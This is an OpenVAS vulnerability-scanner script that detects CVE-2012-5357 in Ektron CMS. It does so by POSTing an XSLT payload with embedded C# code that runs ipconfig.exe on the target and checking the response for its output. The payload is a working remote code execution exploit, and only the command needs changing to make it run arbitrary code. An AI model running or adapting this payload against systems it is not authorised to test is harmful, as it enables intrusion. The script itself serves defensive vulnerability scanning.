###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ektron_cms_56816.nasl 12 2013-10-27 11:15:33Z jan $
#
# Ektron CMS 'XslCompiledTransform' Class Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Ektron CMS is prone to a remote code-execution vulnerability.

Successful exploits will allow remote attackers to execute arbitrary
code within the context of the affected application. Failed attacks
may cause denial-of-service conditions.

Versions prior to Ektron CMS 8.02 Service Pack 5 are vulnerable.";

tag_solution = "Updates are available. Please see the references for details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103624";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56816);
 script_cve_id("CVE-2012-5357");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("Ektron CMS 'XslCompiledTransform' Class Remote Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56816");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-12-10 11:13:54 +0100 (Mo, 10 Dec 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the ipconfig.exe");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_asp(port:port))exit(0);

dirs = make_list("/cms","/cms400min", "/cms400.net", "/cms400", cgi_dirs());
host = get_host_name();

ex = 
'<?xml version="1.0"?>\n' +
 '<xsl:stylesheet version="1.0"\n' +
 'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n' +
 'xmlns:msxsl="urn:schemas-microsoft-com:xslt"\n' +
 'xmlns:user="http://mycompany.com/mynamespace">\n' +
 '<msxsl:script language="C#" implements-prefix="user">\n' +
 '<![CDATA[\n' +
  'public string xml()\n' +
  '{\n' +
   'System.Diagnostics.Process proc = new System.Diagnostics.Process();\n' +
   'proc.StartInfo.UseShellExecute = false;\n' +
   'proc.StartInfo.RedirectStandardOutput = true;\n' +
   'proc.StartInfo.FileName = "ipconfig.exe";\n' +
   'proc.Start();\n' +
   'proc.WaitForExit();\n' +
   'return proc.StandardOutput.ReadToEnd();\n' +
  '}\n' +
 ']]>\n' +
 '</msxsl:script>\n' +
 '<xsl:template match="/">\n' +
 '<xsl:value-of select="user:xml()"/>\n' +
 '</xsl:template>\n' +
 '</xsl:stylesheet>';

ex_encoded = "xml=AAA&xslt=" + urlencode(str:ex);
len = strlen(ex_encoded);

foreach dir (dirs) {

  req = string("POST ",dir,"/WorkArea/ContentDesigner/ekajaxtransform.aspx HTTP/1.1\r\n",
               "Host: ",host,"\r\n",
               "Pragma: no-cache\r\n",
               "Referer: http://",host,"/\r\n",
               "Connection: Close\r\n",
               "Content-Type: application/x-www-form-urlencoded;\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
               ex_encoded);

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(pattern:"Windows.IP..onfiguration", string:result)) {

    security_hole(port:port);
    exit(0);

  }
}

exit(0);

